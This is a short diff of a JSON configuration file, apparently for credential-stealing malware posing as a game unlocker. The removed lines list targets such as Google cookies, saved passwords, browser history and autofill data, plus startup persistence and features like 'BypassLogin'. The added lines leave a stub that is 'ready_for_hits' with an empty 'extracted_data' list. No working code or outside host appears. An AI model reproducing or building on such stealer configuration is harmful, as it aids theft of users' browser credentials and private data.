@@ -1,22 +1,4 @@
 {
-  "status": "success",
-  "mode": "aggressive",
-  "data": {
-    "targets": {
-      "google_cookies": true,
-      "saved_passwords": true,
-      "browser_history": true,
-      "auto_fill_data": true
-    },
-    "persistence": {
-      "always_on": true,
-      "run_at_startup": true,
-      "reconnect_delay": 5
-    },
-    "features": [
-      { "name": "FullGameUnlock", "value": true },
-      { "name": "BypassLogin", "value": true },
-      { "name": "DeepScan", "value": true }
-    ]
-  }
+  "status": "ready_for_hits",
+  "extracted_data": []
 }
